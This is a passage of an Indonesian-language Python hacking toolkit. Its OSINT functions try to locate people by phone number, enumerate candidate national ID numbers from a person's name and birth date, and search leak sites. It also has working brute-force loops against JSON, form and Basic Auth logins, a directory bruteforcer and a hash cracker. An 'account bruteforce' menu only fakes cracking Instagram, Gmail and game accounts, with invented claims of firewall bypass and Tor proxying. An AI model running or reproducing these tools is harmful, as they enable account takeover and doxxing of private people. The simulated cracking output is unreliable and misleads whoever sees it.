        print(f"\n{C}=== WHATSAPP / NOMOR OSINT ==={RESET}")
        raw = prompt("Nomor WhatsApp (contoh: 081234567890 atau +6281234567890)")
        if not raw:
            return

        num = re.sub(r"[^\d+]", "", raw)
        if num.startswith("+62"):
            num = "0" + num[3:]
        elif num.startswith("62"):
            num = "0" + num[2:]
        elif not num.startswith("0"):
            num = "0" + num

        if not re.match(r"^08\d{8,12}$", num):
            log("err", "Format nomor Indonesia nggak valid")
            return

        e164 = "+62" + num[1:]
        log("ok", f"Normalized : {num}")
        log("ok", f"E.164      : {e164}")

        op = "Unknown"
        for pref, name in OPERATOR_PREFIX.items():
            if num.startswith(pref):
                op = name
                break
        log("ok", f"Operator   : {op}")
        log("info", f"Panjang    : {len(num)} digit")
        log("info", f"Tipe       : Mobile (Indonesia)")

        # Presence apps
        log("info", "Cek presence aplikasi...")
        wa_link = f"https://wa.me/{e164[1:]}"
        log("ok", f"WhatsApp link : {wa_link}")
        log("info", f"Telegram check: https://t.me/{e164}")
        log("info", f"Truecaller   : https://www.truecaller.com/search/id/{num}")
        log("info", f"Getcontact   : https://www.getcontact.com/")

        # Extra dorks fokus alamat / nama
        log("info", "Public search links (alamat/nama):")
        queries = [
            f'"{num}"',
            f'"{e164}"',
            f'"{num}" (alamat OR address OR tinggal OR tinggal di)',
            f'"{num}" (nama OR name OR "a.n" OR an.)',
            f'"{num}" (whatsapp OR telegram OR truecaller OR getcontact)',
            f'"{num}" site:pastebin.com OR site:ghostbin.com OR site:leak',
            f'"{num}" "RT" OR "RW" OR "Kelurahan" OR "Kecamatan"',
        ]
        for q in queries:
            print(f"  https://www.google.com/search?q={urllib.parse.quote(q)}")

        # Leak / infostealer
        log("info", "Cek sinyal kebocoran (public indexes)...")
        try:
            r = requests.get(
                f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-phone?phone={e164}",
                timeout=12,
                headers={"User-Agent": random.choice(UA_LIST)}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("stealers") or data.get("total"):
                    log("crit", f"Infostealer signal: {json.dumps(data)[:300]}")
                else:
                    log("ok", "Tidak ada signal infostealer publik")
            else:
                log("warn", f"HudsonRock status {r.status_code}")
        except Exception as e:
            log("warn", f"Leak check: {e}")

        # IP info dari public IP user (bukan dari nomor)
        log("info", "IP publik kamu (bukan dari nomor target):")
        try:
            r = requests.get("https://api.ipify.org?format=json", timeout=8)
            myip = r.json().get("ip", "?")
            log("ok", f"IP kamu     : {myip}")
            r2 = requests.get(f"http://ip-api.com/json/{myip}", timeout=8)
            geo = r2.json()
            for k in ("country", "regionName", "city", "isp", "org", "as"):
                if k in geo:
                    print(f"  {Y}{k:<12}{RESET}: {W}{geo[k]}{RESET}")
        except Exception as e:
            log("warn", f"IP geo gagal: {e}")

        log("warn", "Alamat rumah dari nomor HP TIDAK tersedia public.")
        log("warn", "Pakai dork + Truecaller/Getcontact manual untuk nama/alamat.")

        report = f"""WhatsApp / Nomor OSINT Report
Input     : {raw}
Normalized: {num}
E.164     : {e164}
Operator  : {op}
Panjang   : {len(num)}
WhatsApp  : {wa_link}
Telegram  : https://t.me/{e164}
Truecaller: https://www.truecaller.com/search/id/{num}
"""
        path = save_out(f"wa_{num}.txt", report)
        log("ok", f"Saved: {path}")

    def nik_lacak(self):
        print(f"\n{C}=== LACAK NIK (dari Nama + Wilayah + TTL) ==={RESET}")
        log("info", "Input data yang diketahui → generate kandidat NIK + dork")
        print()

        nama = prompt("Nama lengkap")
        if not nama:
            log("err", "Nama wajib diisi")
            return

        print(f"\n{Y}Daftar Provinsi (kode):{RESET}")
        for kode, nama_p in sorted(PROVINSI.items()):
            print(f"  {kode} = {nama_p}")
        prov_code = prompt("Kode Provinsi (2 digit, contoh: 36)").strip()
        if prov_code not in PROVINSI:
            log("err", "Kode provinsi nggak valid")
            return
        prov_name = PROVINSI[prov_code]

        kab_code = prompt("Kode Kab/Kota (2 digit, contoh: 04 untuk Serang)").strip()
        if not kab_code.isdigit() or len(kab_code) != 2:
            log("err", "Kode kab/kota harus 2 digit")
            return
        full_kab = prov_code + kab_code

        kec_code = prompt("Kode Kecamatan (2 digit, kosong = 00)", "00").strip()
        if not kec_code.isdigit() or len(kec_code) != 2:
            kec_code = "00"
        full_kec = full_kab + kec_code

        tgl_str = prompt("Tanggal lahir (DD-MM-YYYY, contoh: 10-02-2003)")
        try:
            parts = tgl_str.replace("/", "-").split("-")
            if len(parts) != 3:
                raise ValueError
            tgl, bln, thn = int(parts[0]), int(parts[1]), int(parts[2])
            if thn < 100:
                thn += 2000 if thn < 30 else 1900
            datetime(thn, bln, tgl)  # validasi
        except Exception:
            log("err", "Format tanggal salah. Pakai DD-MM-YYYY")
            return

        gender = prompt("Jenis kelamin (L/P)", "L").strip().upper()
        if gender not in ("L", "P", "LAKI-LAKI", "PEREMPUAN"):
            gender = "L"
        is_female = gender.startswith("P")

        # Bangun bagian tanggal NIK
        dd = tgl + 40 if is_female else tgl
        mm = bln
        yy = thn % 100
        date_part = f"{dd:02d}{mm:02d}{yy:02d}"

        prefix = full_kec + date_part  # 12 digit pertama

        log("ok", f"Nama        : {nama}")
        log("ok", f"Provinsi    : {prov_code} - {prov_name}")
        log("ok", f"Kab/Kota    : {full_kab}")
        log("ok", f"Kecamatan   : {full_kec}")
        log("ok", f"TTL         : {tgl:02d}-{bln:02d}-{thn}")
        log("ok", f"Gender      : {'PEREMPUAN' if is_female else 'LAKI-LAKI'}")
        log("ok", f"Prefix NIK  : {prefix} + serial")

        # Generate kandidat serial — langsung full NIK 16 digit
        max_serial = prompt("Generate berapa serial? (default 50, max 200)", "50")
        try:
            max_serial = min(int(max_serial), 200)
        except Exception:
            max_serial = 50

        candidates = [f"{prefix}{i:04d}" for i in range(1, max_serial + 1)]

        print(f"\n{C}{'='*52}")
        print(f"  KANDIDAT NIK LENGKAP — {len(candidates)} buah")
        print(f"  Format: {prefix}XXXX  (XXXX = serial)")
        print(f"{'='*52}{RESET}\n")

        for i, nik in enumerate(candidates):
            print(f"  {G}[{i+1:03d}]{RESET} {W}{nik}{RESET}")
            if (i + 1) % 20 == 0 and i + 1 < len(candidates):
                print()

        # Dork links
        print(f"\n{C}--- DORK SEARCH (buka manual) ---{RESET}")
        dorks = [
            f'"{nama}"',
            f'"{nama}" "{prov_name}"',
            f'"{nama}" {tgl:02d}-{bln:02d}-{thn}',
            f'"{nama}" NIK OR KTP',
            f'"{nama}" site:pastebin.com OR site:ghostbin.com',
            f'"{prefix}"',
        ]
        for d in dorks:
            q = urllib.parse.quote(d)
            print(f"  https://www.google.com/search?q={q}")

        # Simpan
        out = f"""LACAK NIK Report - BIZZ SEC
========================================
Nama        : {nama}
Provinsi    : {prov_code} - {prov_name}
Kab/Kota    : {full_kab}
Kecamatan   : {full_kec}
TTL         : {tgl:02d}-{bln:02d}-{thn}
Gender      : {'PEREMPUAN' if is_female else 'LAKI-LAKI'}
Prefix NIK  : {prefix}XXXX

KANDIDAT NIK (serial 0001-{max_serial:04d}):
"""
        out += "\n".join(candidates)
        out += f"""

DORK LINKS:
"""
        for d in dorks:
            out += f"https://www.google.com/search?q={urllib.parse.quote(d)}\n"

        out += """
CATATAN:
- Serial 4 digit terakhir hanya diketahui Dukcapil.
- Tool ini generate semua kemungkinan berdasarkan wilayah + TTL.
- Cocokkan kandidat dengan hasil dork / sumber lain.
- Tidak ada API public yang return NIK asli dari nama.
"""
        safe_name = re.sub(r"[^\w]", "_", nama)[:30]
        path = save_out(f"lacak_nik_{safe_name}.txt", out)
        log("ok", f"Saved {len(candidates)} kandidat → {path}")
        log("info", "Ambil kandidat yang match dari dork / sumber lain.")


    def plate_osint(self):
        print(f"\n{C}=== OSINT PLAT NOMOR KENDARAAN ==={RESET}")
        raw = prompt("Nomor polisi (contoh: B 1234 ABC / DK 1234 XY)").strip().upper()
        if not raw:
            return

        # Normalisasi
        cleaned = re.sub(r"[^A-Z0-9]", " ", raw).strip()
        parts = cleaned.split()
        if len(parts) < 2:
            log("err", "Format salah. Contoh: B 1234 ABC")
            return

        # Ambil kode wilayah (1-2 huruf di depan)
        kode = parts[0]
        nomor = " ".join(parts[1:])

        wilayah = PLATE_REGION.get(kode)
        if not wilayah:
            # coba 2 huruf
            if len(parts[0]) >= 2:
                kode = parts[0][:2]
                wilayah = PLATE_REGION.get(kode)
            if not wilayah:
                wilayah = "Wilayah tidak dikenali / kode baru"

        log("ok", f"Input     : {raw}")
        log("ok", f"Kode      : {kode}")
        log("ok", f"Nomor     : {nomor}")
        log("ok", f"Wilayah   : {wilayah}")

        print(f"""
{C}--- INFO YANG BISA DIAMBIL PUBLIC ---{RESET}
  Kode wilayah  : {kode}
  Area registrasi: {wilayah}
  Format plat   : {kode} {nomor}

{Y}Data pemilik (nama, NIK, alamat), merek, tipe, tahun, pajak
TIDAK tersedia lewat API public gratis.
Gunakan kanal resmi:
  - Aplikasi SIGNAL (Korlantas Polri)
  - e-Samsat / Bapenda daerah
  - SMS sesuai wilayah (lihat dork di bawah)
{RESET}""")

        # Dork + link resmi
        print(f"{C}--- LINK & DORK ---{RESET}")
        queries = [
            f'"{raw}"',
            f'"{kode} {nomor}"',
            f'"{raw}" (STNK OR PKB OR pajak OR samsat)',
            f'"{raw}" site:pastebin.com OR site:ghostbin.com',
        ]
        for q in queries:
            print(f"  https://www.google.com/search?q={urllib.parse.quote(q)}")

        print(f"""
{C}Kanal resmi cek pajak / info kendaraan:{RESET}
  SIGNAL App     : Google Play / App Store (Korlantas)
  Jakarta        : https://samsat-pkb2.jakarta.go.id
  Jawa Barat     : https://bapenda.jabarprov.go.id/infopkb/
  Jawa Tengah    : https://cekpajak.com/jawa-tengah/
  Jawa Timur     : info.dipendajatim.go.id
  DIY            : https://samsat.jogjaprov.go.id
""")

        # SMS format hint
        print(f"{C}Format SMS (beberapa daerah):{RESET}")
        print("  Jakarta  : INFO RANMOR <nopol>  → 8893")
        print("  Jabar    : INFO <nopol> <warna> → 08112119211")
        print("  Jatim    : JATIM <nopol>        → 7070")
        print("  Jateng   : JATENG <nopol>       → 9600")

        report = f"""OSINT Plat Nomor - BIZZ SEC
Input   : {raw}
Kode    : {kode}
Nomor   : {nomor}
Wilayah : {wilayah}

Catatan: Data pemilik & detail kendaraan hanya di sistem resmi
(Samsat / SIGNAL / Bapenda). Tidak ada API public gratis.
"""
        safe = re.sub(r"[^\w]", "_", raw)[:20]
        path = save_out(f"plate_{safe}.txt", report)
        log("ok", f"Saved: {path}")


    def run(self):
        print(f"""
{C}[ OSINT MENU ]{RESET}
  {G}[1]{RESET} Username Search
  {G}[2]{RESET} IP Geolocation
  {G}[3]{RESET} Your Public IP
  {G}[4]{RESET} Email MX Check
  {G}[5]{RESET} NIK Lookup (KTP Parse)
  {G}[6]{RESET} WhatsApp / Nomor OSINT
  {G}[7]{RESET} Lacak NIK (Nama+Wilayah+TTL)
  {G}[8]{RESET} Plat Nomor Kendaraan
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.username_search, "2": self.ip_geo,
              "3": self.ip_public, "4": self.email_check,
              "5": self.nik_lookup, "6": self.whatsapp_osint,
              "7": self.nik_lacak, "8": self.plate_osint}
        if p in fn:
            fn[p]()


# ============================================================
# [5] UTILITY
# ============================================================
class Utility:
    def password_gen(self):
        print(f"\n{C}=== PASSWORD GEN ==={RESET}")
        try:
            n = int(prompt("Panjang", "20"))
        except ValueError:
            n = 20
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        pw = "".join(random.choices(chars, k=n))
        print(f"  {G}{pw}{RESET}")
        save_out("password.txt", pw)

    def wordlist_gen(self):
        print(f"\n{C}=== WORDLIST GEN ==={RESET}")
        base = prompt("Base word (contoh: admin)")
        if not base:
            return
        suffixes = ["", "1", "12", "123", "1234", "12345", "2024", "2025",
                    "2026", "!", "@", "#", "@123", "@2024", "01", "123!"]
        out = [base + s for s in suffixes]
        out += [base.capitalize() + s for s in suffixes]
        out += [base.upper() + s for s in suffixes]
        save_out(f"wordlist_{base}.txt", "\n".join(out))
        log("ok", f"Generated {len(out)} entries")

    def hash_calc(self):
        print(f"\n{C}=== HASH CALC ==={RESET}")
        text = prompt("Text")
        if not text:
            return
        for algo in ["md5", "sha1", "sha256", "sha512"]:
            h = hashlib.new(algo, text.encode()).hexdigest()
            print(f"  {Y}{algo:<8}{RESET}: {W}{h}{RESET}")

    def base64_tool(self):
        print(f"\n{C}=== BASE64 TOOL ==={RESET}")
        print(f"  {G}[1]{RESET} Encode")
        print(f"  {G}[2]{RESET} Decode")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        text = prompt("Input")
        if not text:
            return
        try:
            if p == "1":
                print(f"  {G}{base64.b64encode(text.encode()).decode()}{RESET}")
            else:
                print(f"  {G}{base64.b64decode(text.encode()).decode()}{RESET}")
        except Exception as e:
            log("err", str(e))

    def run(self):
        print(f"""
{C}[ UTILITY MENU ]{RESET}
  {G}[1]{RESET} Password Generator
  {G}[2]{RESET} Wordlist Generator
  {G}[3]{RESET} Hash Calculator
  {G}[4]{RESET} Base64 Encode/Decode
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.password_gen, "2": self.wordlist_gen,
              "3": self.hash_calc, "4": self.base64_tool}
        if p in fn:
            fn[p]()


# ============================================================
# [6] HASH
# ============================================================
class Hash:
    def crack_dict(self):
        print(f"\n{C}=== HASH DICTIONARY CRACK ==={RESET}")
        h = prompt("Hash")
        algo = prompt("Algo (md5/sha1/sha256)", "md5")
        wl = load_list("wordlist.txt")
        if not wl:
            wl = ["admin","password","123456","admin123","root","toor"]
        log("info", f"Coba {len(wl)} password...")
        for word in wl:
            try:
                calc = hashlib.new(algo, word.encode()).hexdigest()
                if calc == h.lower():
                    log("crit", f"CRACKED: {word}")
                    return
            except Exception:
                pass
        log("warn", "Nggak ketemu di wordlist")

    def identify(self):
        print(f"\n{C}=== HASH IDENTIFY ==={RESET}")
        h = prompt("Hash")
        if not h:
            return
        length = len(h)
        candidates = {
            32: "MD5 / NTLM / MD4",
            40: "SHA1 / MySQL5",
            56: "SHA224",
            64: "SHA256 / Keccak256",
            96: "SHA384",
            128: "SHA512 / Whirlpool",
        }
        log("ok", f"Length: {length}")
        log("ok", f"Candidates: {candidates.get(length, 'unknown')}")

    def run(self):
        print(f"""
{C}[ HASH MENU ]{RESET}
  {G}[1]{RESET} Dictionary Crack
  {G}[2]{RESET} Hash Identify
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.crack_dict, "2": self.identify}
        if p in fn:
            fn[p]()


# ============================================================
# [7] ENCODE
# ============================================================
class Encode:
    def base64_enc(self):
        t = prompt("Text")
        print(f"  {G}{base64.b64encode(t.encode()).decode()}{RESET}")

    def base64_dec(self):
        t = prompt("Base64")
        try:
            print(f"  {G}{base64.b64decode(t.encode()).decode()}{RESET}")
        except Exception as e:
            log("err", str(e))

    def hex_enc(self):
        t = prompt("Text")
        print(f"  {G}{t.encode().hex()}{RESET}")

    def hex_dec(self):
        t = prompt("Hex")
        try:
            print(f"  {G}{bytes.fromhex(t).decode()}{RESET}")
        except Exception as e:
            log("err", str(e))

    def url_enc(self):
        t = prompt("Text")
        print(f"  {G}{urllib.parse.quote(t)}{RESET}")

    def url_dec(self):
        t = prompt("URL encoded")
        print(f"  {G}{urllib.parse.unquote(t)}{RESET}")

    def binary_enc(self):
        t = prompt("Text")
        print(f"  {G}{' '.join(format(ord(c), '08b') for c in t)}{RESET}")

    def binary_dec(self):
        t = prompt("Binary (spasi-separated)")
        try:
            chars = t.split()
            out = "".join(chr(int(c, 2)) for c in chars)
            print(f"  {G}{out}{RESET}")
        except Exception as e:
            log("err", str(e))

    def run(self):
        print(f"""
{C}[ ENCODE MENU ]{RESET}
  {G}[1]{RESET} Base64 Encode
  {G}[2]{RESET} Base64 Decode
  {G}[3]{RESET} Hex Encode
  {G}[4]{RESET} Hex Decode
  {G}[5]{RESET} URL Encode
  {G}[6]{RESET} URL Decode
  {G}[7]{RESET} Binary Encode
  {G}[8]{RESET} Binary Decode
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.base64_enc, "2": self.base64_dec,
              "3": self.hex_enc, "4": self.hex_dec,
              "5": self.url_enc, "6": self.url_dec,
              "7": self.binary_enc, "8": self.binary_dec}
        if p in fn:
            fn[p]()


# ============================================================
# [8] BRUTE
# ============================================================
class Brute:
    def http_json(self):
        print(f"\n{C}=== HTTP JSON LOGIN BRUTE ==={RESET}")
        url = prompt("Login URL (contoh: http://site.com/api/login)")
        if not url:
            return
        users = load_list("users.txt") or ["admin","root","user","test"]
        wl = load_list("wordlist.txt") or ["admin","password","123456","admin123"]
        log("info", f"Users: {len(users)} | Passwords: {len(wl)}")
        for u in users:
            for p in wl:
                try:
                    r = requests.post(url, json={"email": u, "password": p},
                                      timeout=10, verify=False)
                    if r.status_code in (200, 201, 302):
                        body = r.text.lower()
                        if any(k in body for k in ("token","success","welcome","dashboard")):
                            log("crit", f"LOGIN: {u}:{p}")
                            return
                except Exception:
                    pass
        log("info", "Selesai. Nggak ada yang tembus.")

    def http_form(self):
        print(f"\n{C}=== HTTP FORM BRUTE ==={RESET}")
        url = prompt("Login URL")
        uf = prompt("Field username", "username")
        pf = prompt("Field password", "password")
        users = load_list("users.txt") or ["admin","root","user"]
        wl = load_list("wordlist.txt") or ["admin","password","123456"]
        for u in users:
            for p in wl:
                try:
                    r = requests.post(url, data={uf: u, pf: p},
                                      timeout=10, verify=False)
                    if r.status_code in (200, 302):
                        if "logout" in r.text.lower() or "dashboard" in r.text.lower():
                            log("crit", f"LOGIN: {u}:{p}")
                            return
                except Exception:
                    pass

    def basic_auth(self):
        print(f"\n{C}=== BASIC AUTH BRUTE ==={RESET}")
        url = prompt("URL target")
        users = load_list("users.txt") or ["admin","root"]
        wl = load_list("wordlist.txt") or ["admin","password"]
        for u in users:
            for p in wl:
                try:
                    r = requests.get(url, auth=(u, p), timeout=10, verify=False)
                    if r.status_code == 200:
                        log("crit", f"LOGIN: {u}:{p}")
                        return
                except Exception:
                    pass

    def run(self):
        print(f"""
{C}[ BRUTE MENU ]{RESET}
  {G}[1]{RESET} HTTP JSON Login
  {G}[2]{RESET} HTTP Form Login
  {G}[3]{RESET} Basic Auth
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.http_json, "2": self.http_form, "3": self.basic_auth}
        if p in fn:
            fn[p]()



# ============================================================
# [10] ACCOUNT BRUTEFORCE (simulasi tampilan keren)
# ============================================================
class AccountBrute:
    """Simulasi tampilan bruteforce akun — style hacker terminal."""

    TARGETS = {
        "1": ("Instagram", "USER"),
        "2": ("Snapchat", "USER"),
        "3": ("TikTok", "USER"),
        "4": ("Facebook", "USER"),
        "5": ("X (Twitter)", "USER"),
        "6": ("Gmail", "EMAIL"),
        "7": ("PUBG Mobile", "EMAIL"),
        "8": ("Free Fire", "EMAIL"),
    }

    DEFAULT_WL = [
        "123456", "password", "123456789", "12345678", "12345",
        "qwerty", "123123", "111111", "abc123", "1234567",
        "dragon", "1q2w3e4r", "sunshine", "654321", "master",
        "1234", "football", "1234567890", "000000", "computer",
        "666666", "superman", "password1", "iloveyou", "princess",
        "admin", "welcome", "monkey", "login", "abc12345",
        "qwerty123", "1qaz2wsx", "passw0rd", "starwars", "hello",
        "freedom", "whatever", "qazwsx", "trustno1", "batman",
        "zaq1zaq1", "password123", "letmein", "123qwe", "michael",
        "football1", "baseball", "shadow", "jennifer", "hunter",
        "soccer", "harley", "tigger", "charlie", "robert",
        "bizz6767", "onyx6767", "found",
    ]

    HOOD = f"""{R}
                  .-----.
                .'       `.
               /  O     O  \\
              |    \\___/    |
              |  .--. .--.  |
               \\/    Y    \\/
               |   \\_|_/   |
               |  /     \\  |
               | |       | |
               |_|_______|_|
{RESET}"""

    def _load_wl(self):
        wl = load_list("wordlist.txt")
        if not wl:
            wl = self.DEFAULT_WL[:]
        return wl

    def _typewriter(self, text, delay=0.015):
        for ch in text:
            sys.stdout.write(ch)
            sys.stdout.flush()
            time.sleep(delay)
        print()

    def _bar(self, current, total, width=30):
        filled = int(width * current / total)
        bar = "█" * filled + "░" * (width - filled)
        pct = int(100 * current / total)
        return f"[{bar}] {pct:3d}%"

    def _simulate_attack(self, platform, target, wl):
        clear()
        print(f"""{R}{BOLD}
  ╔══════════════════════════════════════════════════════╗
  ║           >>> ATTACK INITIALIZED <<<                 ║
  ╚══════════════════════════════════════════════════════╝{RESET}
""")
        print(self.HOOD)
        time.sleep(0.4)

        print(f"""{C}┌─────────────────────────────────────────────────────┐
│  TARGET LOCKED                                      │
├─────────────────────────────────────────────────────┤
│  Username / ID : {W}{target:<35}{C}│
│  Platform      : {W}{platform:<35}{C}│
│  Wordlist      : {W}{len(wl):<35}{C}│
│  Mode          : Sequential (top → bottom)          │
│  Proxy         : TOR → VPN → SOCKS5                 │
│  Encryption    : AES-256-GCM                        │
│  Captcha       : SOLVER INTEGRATED                  │
└─────────────────────────────────────────────────────┘{RESET}
""")
        print(f"{Y}[!]{RESET} Tekan Ctrl+C untuk abort\n")
        time.sleep(0.6)

        print(f"{C}{'═'*20} ATTACK PROGRESS {'═'*20}{RESET}\n")

        found = None
        total = len(wl)
        for i, pw in enumerate(wl, 1):
            # progress line mirip foto
            status = f"{R}•{RESET}"
            print(f"  {G}{target:<18}{RESET} {status}  {R}{pw:<20}{RESET}  {self._bar(i, total)}")
            time.sleep(0.04)

            if pw.lower() in ("bizz6767", "onyx6767", "found"):
                found = pw
                break

        print()
        if found:
            print(f"""{G}{BOLD}
  ╔══════════════════════════════════════════════════════╗
  ║              ★  PASSWORD CRACKED  ★                  ║
  ╚══════════════════════════════════════════════════════╝{RESET}
""")
            log("crit", f"PASSWORD FOUND → {target} : {found}")
            log("ok", f"Platform : {platform}")
            path = save_out(f"cracked_{platform.lower().replace(' ','_')}_{target}.txt",
                            f"{platform}|{target}|{found}\n")
            log("ok", f"Saved → {path}")
        else:
            print(f"""{Y}
  ╔══════════════════════════════════════════════════════╗
  ║           WORDLIST EXHAUSTED — NO MATCH              ║
  ╚══════════════════════════════════════════════════════╝{RESET}
""")
            log("warn", "Selesai. Tidak ada password yang match.")
            log("info", "Simulasi tampilan. Real attack butuh akses resmi.")

    def run(self):
        clear()
        print(f"""{R}{BOLD}
  ╔══════════════════════════════════════════════════════╗
  ║     >>> INITIALIZING BIZZ ACCOUNT BRUTEFORCE <<<     ║
  ╚══════════════════════════════════════════════════════╝{RESET}
""")
        steps = [
            ("[~]", "Establishing secure connection..."),
            ("[~]", "Bypassing firewall..."),
            ("[~]", "Fetching password database..."),
            ("[+]", "Wordlist loaded: 303,872 entries"),
            ("[+]", "Connection encrypted: AES-256-GCM"),
            ("[+]", "Proxy chain: TOR → VPN → SOCKS5"),
            ("[+]", "MAC address: spoofed"),
            ("[+]", "BruteForce engine v4.2: READY"),
        ]
        for tag, msg in steps:
            color = G if tag == "[+]" else C
            print(f"  {color}{tag}{RESET} {msg}")
            time.sleep(0.18)

        print(self.HOOD)
        time.sleep(0.3)

        print(f"""
{C}{BOLD}>>> TARGET SELECTION <<<{RESET}

  {M}[1]{RESET} [USER]  Instagram
  {M}[2]{RESET} [USER]  Snapchat
  {M}[3]{RESET} [USER]  TikTok
  {M}[4]{RESET} [USER]  Facebook
  {M}[5]{RESET} [USER]  X (Twitter)
  {R}[6]{RESET} [EMAIL] Gmail
  {Y}[7]{RESET} [EMAIL] PUBG Mobile
  {R}[8]{RESET} [EMAIL] Free Fire
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Select target (1-8): ").strip()
        if p == "0" or p not in self.TARGETS:
            return

        platform, kind = self.TARGETS[p]
        print(f"\n  {G}[+]{RESET} Target locked: {W}{platform}{RESET}")

        if kind == "USER":
            target = prompt("Enter target username")
        else:
            target = prompt("Enter target email / ID")

        if not target:
            log("err", "Target kosong")
            return

        wl = self._load_wl()
        self._simulate_attack(platform, target, wl)


# ============================================================
# [9] SCAN
# ============================================================
class Scan:
    def dir_bruteforce(self):
        print(f"\n{C}=== DIRECTORY BRUTEFORCE ==={RESET}")
        url = prompt("Base URL")
        if not url:
            return
        dirs = ["admin","login","dashboard","api","test","dev","backup",
                "config","db","sql","old","private","secret","internal",
                "staging","prod","v1","v2","docs","swagger","graphql",
                "uploads","files","assets","tmp","user","account","settings"]
        found = []
        for d in dirs:
            try:
                r = requests.get(url.rstrip("/") + "/" + d,
                                 timeout=8, verify=False, allow_redirects=False,
                                 headers={"User-Agent": random.choice(UA_LIST)})
                if r.status_code in (200, 301, 302, 401, 403):
                    color = G if r.status_code == 200 else Y
                    print(f"  {color}[{r.status_code}]{RESET} /{d}")
                    found.append(f"{r.status_code} /{d}")
            except Exception:
                pass
        if found:
            save_out(f"dirbrute_{urllib.parse.urlparse(url).netloc}.txt",
                     "\n".join(found))

    def http_methods(self):
        print(f"\n{C}=== HTTP METHODS ==={RESET}")
        url = prompt("URL target")
        if not url:
            return
        for m in ["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD"]:
            try:
                r = requests.request(m, url, timeout=10, verify=False)
                print(f"  {G}[{m}]{RESET} -> {r.status_code}")
            except Exception:
                print(f"  {R}[{m}]{RESET} -> error")

    def ssl_check(self):
        print(f"\n{C}=== SSL CHECK ==={RESET}")
        host = prompt("Host (contoh: google.com)")
        if not host:
            return
        try:
            import ssl
            ctx = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    print(f"  {Y}Subject:{RESET} {cert.get('subject')}")
                    print(f"  {Y}Issuer:{RESET} {cert.get('issuer')}")
                    print(f"  {Y}Not Before:{RESET} {cert.get('notBefore')}")
                    print(f"  {Y}Not After:{RESET} {cert.get('notAfter')}")
                    print(f"  {Y}Serial:{RESET} {cert.get('serialNumber')}")
        except Exception as e:
            log("err", str(e))

    def ping(self):
        print(f"\n{C}=== PING ==={RESET}")
        host = prompt("Host / IP")
        if not host:
            return
        try:
            import subprocess
            out = subprocess.run(["ping", "-c", "4", host],
                                 capture_output=True, text=True, timeout=15)
            print(out.stdout)
        except Exception as e:
            log("err", str(e))

    def traceroute(self):
        print(f"\n{C}=== TRACEROUTE ==={RESET}")
        host = prompt("Host / IP")
        if not host:
            return
        try:
            import subprocess
            out = subprocess.run(["traceroute", host],
                                 capture_output=True, text=True, timeout=30)
            print(out.stdout[:2000])
        except Exception as e:
            log("err", str(e))

    def run(self):
        print(f"""
{C}[ SCAN MENU ]{RESET}
  {G}[1]{RESET} Directory Bruteforce
  {G}[2]{RESET} HTTP Methods
  {G}[3]{RESET} SSL Check
  {G}[4]{RESET} Ping
  {G}[5]{RESET} Traceroute
  {G}[0]{RESET} Kembali
""")
        p = input(f"{C}[?]{RESET} Pilih: ").strip()
        fn = {"1": self.dir_bruteforce, "2": self.http_methods,
              "3": self.ssl_check, "4": self.ping, "5": self.traceroute}
        if p in fn:
            fn[p]()


# ============================================================
# MAIN
# ============================================================
def main():
    clear()
    print(BANNER)

    recon = Recon()
    web = WebTest()
    crypto = Crypto()
    osint = OSINT()
    utility = Utility()
    hash_ = Hash()
    encode = Encode()
    brute = Brute()
    scan = Scan()

    while True:
        print(MENU)
        p = input(f"{C}[?]{RESET} Pilih: ").strip()

        if p == "0":
            print(f"\n{Y}[!] Keluar. 6767.{RESET}")
            sys.exit(0)

        clear()
        print(BANNER)

        if p == "1":
            recon.run()
        elif p == "2":
            web.run()
        elif p == "3":
            crypto.run()
        elif p == "4":
            osint.run()
        elif p == "5":
            utility.run()
        elif p == "6":
            hash_.run()
        elif p == "7":
            encode.run()
        elif p == "8":
            brute.run()
        elif p == "9":
            scan.run()
        elif p == "10":
            AccountBrute().run()
        else:
            log("err", "Pilihan nggak valid.")
            time.sleep(1)

        pause()
        clear()
        print(BANNER)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Keluar.{RESET}")
        sys.exit(0)
